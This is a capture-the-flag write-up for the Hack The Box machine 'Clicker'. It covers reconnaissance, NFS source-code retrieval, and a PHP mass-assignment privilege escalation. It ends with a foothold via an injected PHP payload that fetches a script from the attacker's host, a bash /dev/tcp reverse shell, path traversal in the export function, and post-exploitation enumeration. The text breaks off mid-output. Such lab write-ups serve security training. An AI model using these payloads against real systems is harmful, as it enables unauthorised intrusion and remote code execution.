# Clicker

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV 10.129.100.162                                                                                                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 19:03 UTC
Nmap scan report for clicker.htb (10.129.100.162)
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Clicker - The Game
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45097/tcp6  mountd
|   100005  1,2,3      49197/udp   mountd
|   100005  1,2,3      49387/tcp   mountd
|   100005  1,2,3      49496/udp6  mountd
|   100021  1,3,4      40205/tcp6  nlockmgr
|   100021  1,3,4      42685/tcp   nlockmgr
|   100021  1,3,4      47883/udp6  nlockmgr
|   100021  1,3,4      58985/udp   nlockmgr
|   100024  1          43402/udp6  status
|   100024  1          50175/tcp   status
|   100024  1          51077/tcp6  status
|   100024  1          58721/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/23%OT=22%CT=1%CU=31778%PV=Y%DS=2%DC=T%G=Y%TM=650F36A
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=FD
OS:%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53AN
OS:NT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3
OS:=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y
OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%D
OS:F=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   105.06 ms 10.10.16.1
2   105.11 ms clicker.htb (10.129.100.162)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.03 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.100.162
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 19:06 UTC
Nmap scan report for clicker.htb (10.129.100.162)
Host is up (0.22s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Clicker - The Game
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45097/tcp6  mountd
|   100005  1,2,3      49197/udp   mountd
|   100005  1,2,3      49387/tcp   mountd
|   100005  1,2,3      49496/udp6  mountd
|   100021  1,3,4      40205/tcp6  nlockmgr
|   100021  1,3,4      42685/tcp   nlockmgr
|   100021  1,3,4      47883/udp6  nlockmgr
|   100021  1,3,4      58985/udp   nlockmgr
|   100024  1          43402/udp6  status
|   100024  1          50175/tcp   status
|   100024  1          51077/tcp6  status
|   100024  1          58721/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
36165/tcp open  mountd   1-3 (RPC #100005)
40725/tcp open  mountd   1-3 (RPC #100005)
42685/tcp open  nlockmgr 1-4 (RPC #100021)
49387/tcp open  mountd   1-3 (RPC #100005)
50175/tcp open  status   1 (RPC #100024)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/23%OT=22%CT=1%CU=36629%PV=Y%DS=2%DC=T%G=Y%TM=650F39B
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11N
OS:W7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   189.72 ms 10.10.16.1
2   102.94 ms clicker.htb (10.129.100.162)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 642.09 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.100.162
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 19:18 UTC
Nmap scan report for clicker.htb (10.129.100.162)
Host is up (0.21s latency).
Not shown: 991 closed udp ports (port-unreach)
PORT      STATE         SERVICE VERSION
17/udp    open|filtered qotd
68/udp    open|filtered dhcpc
111/udp   open          rpcbind 2-4 (RPC #100000)
16402/udp open|filtered unknown
19017/udp open|filtered unknown
34433/udp open|filtered unknown
45441/udp open|filtered unknown
49197/udp open          mountd  1-3 (RPC #100005)
57172/udp open|filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1085.27 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.100.162/

We added `clicker.htb` to our `/etc/hosts` files.

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.100.162  clicker.htb
```

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://clicker.htb/
http://clicker.htb/ [200 OK] Apache[2.4.52], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.100.162], Title[Clicker - The Game]
```

#### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://clicker.htb/   

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/clicker.htb/-_23-09-23_19-02-46.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-09-23_19-02-46.log

Target: http://clicker.htb/

[19:02:47] Starting: 
[19:02:53] 403 -  276B  - /.ht_wsr.txt                                     
[19:02:53] 403 -  276B  - /.htaccess.bak1                                  
[19:02:53] 403 -  276B  - /.htaccess.save
[19:02:53] 403 -  276B  - /.htaccess.sample
[19:02:53] 403 -  276B  - /.htaccess.orig
[19:02:53] 403 -  276B  - /.htaccess_orig
[19:02:53] 403 -  276B  - /.htaccess_extra
[19:02:53] 403 -  276B  - /.htaccessBAK
[19:02:53] 403 -  276B  - /.htaccess_sc
[19:02:53] 403 -  276B  - /.htaccessOLD2
[19:02:53] 403 -  276B  - /.htaccessOLD
[19:02:53] 403 -  276B  - /.html
[19:02:53] 403 -  276B  - /.htm                                            
[19:02:53] 403 -  276B  - /.htpasswds
[19:02:53] 403 -  276B  - /.htpasswd_test
[19:02:53] 403 -  276B  - /.httr-oauth
[19:02:55] 403 -  276B  - /.php                                            
[19:03:05] 302 -    0B  - /admin.php  ->  /index.php                        
[19:03:14] 301 -  311B  - /assets  ->  http://clicker.htb/assets/           
[19:03:14] 403 -  276B  - /assets/                                          
[19:03:15] 200 -    0B  - /authenticate.php                                 
[19:03:25] 302 -    0B  - /export.php  ->  /index.php                       
[19:03:30] 200 -    3KB - /index.php                                        
[19:03:30] 200 -    3KB - /index.php/login/                                 
[19:03:30] 200 -    3KB - /info.php                                         
[19:03:33] 200 -    3KB - /login.php                                        
[19:03:33] 302 -    0B  - /logout.php  ->  /index.php                       
[19:03:44] 302 -    0B  - /profile.php  ->  /index.php                      
[19:03:45] 200 -    3KB - /register.php                                     
[19:03:47] 403 -  276B  - /server-status/                                   
[19:03:47] 403 -  276B  - /server-status
                                                                             
Task Completed
```

> http://clicker.htb/info.php

> http://clicker.htb/register.php

> http://clicker.htb/login.php

| Potential Usernames |
| --- |
| ButtonLover99 |
| Paol |
| Th3Br0 |

We registered a new `user`, `logged` in and found a new page.

> http://clicker.htb/play.php

### Subdomain Enumeration with ffuf

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.clicker.htb" -u http://clicker.htb --fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://clicker.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.clicker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

[Status: 200, Size: 2984, Words: 686, Lines: 108, Duration: 357ms]
    * FUZZ: www

:: Progress: [114441/114441] :: Job [1/1] :: 283 req/sec :: Duration: [0:06:13] :: Errors: 0 ::
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.100.162  clicker.htb
10.129.100.162  www.clicker.htb
```

### Directory Busting on Subdomain

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://www.clicker.htb/

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/www.clicker.htb/-_23-09-23_19-11-06.txt

Error Log: /home/user/.dirsearch/logs/errors-23-09-23_19-11-06.log

Target: http://www.clicker.htb/

[19:11:06] Starting: 
[19:11:13] 403 -  280B  - /.ht_wsr.txt                                     
[19:11:13] 403 -  280B  - /.htaccess.bak1                                  
[19:11:13] 403 -  280B  - /.htaccess.sample
[19:11:13] 403 -  280B  - /.htaccess.orig
[19:11:13] 403 -  280B  - /.htaccess.save
[19:11:13] 403 -  280B  - /.htaccess_orig
[19:11:13] 403 -  280B  - /.htaccess_extra
[19:11:13] 403 -  280B  - /.htaccess_sc
[19:11:13] 403 -  280B  - /.htaccessOLD
[19:11:13] 403 -  280B  - /.htaccessOLD2
[19:11:13] 403 -  280B  - /.htaccessBAK
[19:11:13] 403 -  280B  - /.html                                           
[19:11:13] 403 -  280B  - /.htm
[19:11:13] 403 -  280B  - /.htpasswd_test
[19:11:13] 403 -  280B  - /.htpasswds
[19:11:13] 403 -  280B  - /.httr-oauth
[19:11:15] 403 -  280B  - /.php                                            
[19:11:24] 302 -    0B  - /admin.php  ->  /index.php                        
[19:11:33] 301 -  319B  - /assets  ->  http://www.clicker.htb/assets/       
[19:11:33] 403 -  280B  - /assets/
[19:11:33] 200 -    0B  - /authenticate.php                                 
[19:11:43] 302 -    0B  - /export.php  ->  /index.php                       
[19:11:47] 200 -    3KB - /index.php                                        
[19:11:47] 200 -    3KB - /index.php/login/                                 
[19:11:47] 200 -    3KB - /info.php                                         
[19:11:50] 200 -    3KB - /login.php                                        
[19:11:50] 302 -    0B  - /logout.php  ->  /index.php                       
[19:12:01] 302 -    0B  - /profile.php  ->  /index.php                      
[19:12:02] 200 -    3KB - /register.php                                     
[19:12:04] 403 -  280B  - /server-status/                                   
[19:12:04] 403 -  280B  - /server-status                                    
                                                                             
Task Completed
```

### NFS Enumeration

```c
┌──(user㉿kali)-[~]
└─$ showmount -e 10.129.100.162
Export list for 10.129.100.162:
/mnt/backups *
```

```c
┌──(user㉿kali)-[~]
└─$ sudo mount -t nfs 10.129.100.162:/mnt/backups /media/mount -o nolock
```

```c
┌──(user㉿kali)-[/media/mount]
└─$ ls
clicker.htb_backup.zip
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ unzip clicker.htb_backup.zip 
Archive:  clicker.htb_backup.zip
   creating: clicker.htb/
  inflating: clicker.htb/play.php    
  inflating: clicker.htb/profile.php  
  inflating: clicker.htb/authenticate.php  
  inflating: clicker.htb/create_player.php  
  inflating: clicker.htb/logout.php  
   creating: clicker.htb/assets/
  inflating: clicker.htb/assets/background.png  
  inflating: clicker.htb/assets/cover.css  
  inflating: clicker.htb/assets/cursor.png  
   creating: clicker.htb/assets/js/
  inflating: clicker.htb/assets/js/bootstrap.js.map  
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js.map  
  inflating: clicker.htb/assets/js/bootstrap.min.js.map  
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js  
  inflating: clicker.htb/assets/js/bootstrap.min.js  
  inflating: clicker.htb/assets/js/bootstrap.bundle.js  
  inflating: clicker.htb/assets/js/bootstrap.bundle.js.map  
  inflating: clicker.htb/assets/js/bootstrap.js  
   creating: clicker.htb/assets/css/
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css  
  inflating: clicker.htb/assets/css/bootstrap-reboot.css  
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css.map  
  inflating: clicker.htb/assets/css/bootstrap.min.css.map  
  inflating: clicker.htb/assets/css/bootstrap.css.map  
  inflating: clicker.htb/assets/css/bootstrap-grid.css  
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css.map  
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css  
  inflating: clicker.htb/assets/css/bootstrap.min.css  
  inflating: clicker.htb/assets/css/bootstrap-grid.css.map  
  inflating: clicker.htb/assets/css/bootstrap.css  
  inflating: clicker.htb/assets/css/bootstrap-reboot.css.map  
  inflating: clicker.htb/login.php   
  inflating: clicker.htb/admin.php   
  inflating: clicker.htb/info.php    
  inflating: clicker.htb/diagnostic.php  
  inflating: clicker.htb/save_game.php  
  inflating: clicker.htb/register.php  
  inflating: clicker.htb/index.php   
  inflating: clicker.htb/db_utils.php  
   creating: clicker.htb/exports/
  inflating: clicker.htb/export.php
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ cat clicker.htb/admin.php
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}
?>
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ cat clicker.htb/diagnostic.php
<?php
if (isset($_GET["token"])) {
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
        }
}
else {
    header("HTTP/1.1 401 Unauthorized");
    die;
}

function array_to_xml( $data, &$xml_data ) {
    foreach( $data as $key => $value ) {
        if( is_array($value) ) {
            if( is_numeric($key) ){
                $key = 'item'.$key;
            }
        $subnode = $xml_data->addChild($key);
        array_to_xml($value, $subnode);
        } else {
            $xml_data->addChild("$key",htmlspecialchars("$value"));
        }
        }
}

$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";

$connection_test = "OK";

try {
        $pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
} catch(PDOException $ex){
    $connection_test = "KO";
}
$data=[];
$data["timestamp"] = time();
$data["date"] = date("Y/m/d h:i:sa");
$data["php-version"] = phpversion();
$data["test-connection-db"] = $connection_test;
$data["memory-usage"] = memory_get_usage();
$env = getenv();
$data["environment"] = $env;

$xml_data = new SimpleXMLElement('<?xml version="1.0"?><data></data>');
array_to_xml($data,$xml_data);
$result = $xml_data->asXML();
print $result;
?>
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ cat clicker.htb/save_game.php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
        $args = [];
        foreach($_GET as $key=>$value) {
                if (strtolower($key) === 'role') {
                        // prevent malicious users to modify role
                        header('Location: /index.php?err=Malicious activity detected!');
                        die;
                }
                $args[$key] = $value;
        }
        save_profile($_SESSION['PLAYER'], $_GET);
        // update session info
        $_SESSION['CLICKS'] = $_GET['clicks'];
        $_SESSION['LEVEL'] = $_GET['level'];
        header('Location: /index.php?msg=Game has been saved!');

}
?>
```

## PHP Mass Assignment

Payload:

```c
role="admin"#
```

URL encoded Payload:

```c
%72%6f%6c%65%3d%22%61%64%6d%69%6e%22%23
```

Modified Request:

```c
GET /save_game.php?clicks=46&level=1&%72%6f%6c%65%3d%22%41%64%6d%69%6e%22%23 HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=7vontrpblu8vte37ujuk5rchv4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
GET /index.php?msg=Game%20has%20been%20saved! HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://clicker.htb/play.php
DNT: 1
Connection: close
Cookie: PHPSESSID=7vontrpblu8vte37ujuk5rchv4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

We needed to `logout` and `relogin` to see the `admin panel`.

> http://clicker.htb/admin.php

> http://clicker.htb/admin.php?msg=Data%20has%20been%20saved%20in%20exports/top_players_w4s25ilo.

## Foothold

Request:

```c
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
DNT: 1
Connection: close
Referer: http://clicker.htb/admin.php
Cookie: PHPSESSID=7vontrpblu8vte37ujuk5rchv4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

threshold=1000000&extension=txt
```

```c
Data has been saved in exports/top_players_l4svylaf.txt
```

> http://clicker.htb/exports/top_players_l4svylaf.txt

```c
Nickname:  Clicks:  Level: 
Nickname: admin Clicks: 999999999999999999 Level: 999999999
Nickname: ButtonLover99 Clicks: 10000000 Level: 100
Nickname: Paol Clicks: 2776354 Level: 75
Nickname: Th3Br0 Clicks: 87947322 Level: 1
```

We repeating the previous steps with a new payload.

Payload:

```c
<?php echo system("curl 10.10.16.12/shell|bash");?>
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/serve]
└─$ cat shell 
/bin/bash -i >& /dev/tcp/10.10.16.12/9001 0>&1
```

URL encoded Payload:

```c
%3c%3f%70%68%70%20%65%63%68%6f%20%73%79%73%74%65%6d%28%22%63%75%72%6c%20%31%30%2e%31%30%2e%31%36%2e%31%32%2f%73%68%65%6c%6c%7c%62%61%73%68%22%29%3b%3f%3e
```

Modified Request:

```c
GET /save_game.php?clicks=91&level=1&nickname=%3c%3f%70%68%70%20%65%63%68%6f%20%73%79%73%74%65%6d%28%22%63%75%72%6c%20%31%30%2e%31%30%2e%31%36%2e%31%32%2f%73%68%65%6c%6c%7c%62%61%73%68%22%29%3b%3f%3e HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=7vontrpblu8vte37ujuk5rchv4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

```c
┌──(user㉿kali)-[~]
└─$ curl -sX POST 'http://clicker.htb/export.php' -b 'PHPSESSID=7vontrpblu8vte37ujuk5rchv4' -d 'extension=../../x.php' -v 2>&1 | grep -Eo exports/.*\.php && curl -s 'http://clicker.htb/exports/x.php'
exports/top_players_dglcn1fo.../../x.php
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.100.162 - - [23/Sep/2023 22:00:49] "GET /shell HTTP/1.1" 200 -
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.100.162] 34462
bash: cannot set terminal process group (1209): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$
```

## Stabilizing Shell

```c
www-data@clicker:/var/www/clicker.htb/exports$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<rts$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@clicker:/var/www/clicker.htb/exports$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(user㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

www-data@clicker:/var/www/clicker.htb/exports$ 
www-data@clicker:/var/www/clicker.htb/exports$ export XTERM=xterm
```

## Enumeration

```c
www-data@clicker:/var/www/clicker.htb/exports$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```c
www-data@clicker:/var/www/clicker.htb/exports$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

| Username |
| --- |
| Jack |

```c
www-data@clicker:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Jul 20 10:00 .
drwxr-xr-x 18 root root 4096 Sep  5 19:19 ..
drwxr-xr-x  2 jack jack 4096 Jul 21 22:29 manage
-rwxr-xr-x  1 root root  504 Jul 20 10:00 monitor.sh
```

```c
www-data@clicker:/opt/manage$ ls -la
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21 22:29 .
drwxr-xr-x 3 root root  4096 Jul 20 10:00 ..
-rw-rw-r-- 1 jack jack   256 Jul 21 22:29 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
```

```c
www-data@clicker:/opt/manage$ cat README.txt 
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
```

```c
www-data@clicker:/opt/manage$ ./execute_query 1 /etc/passwd
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
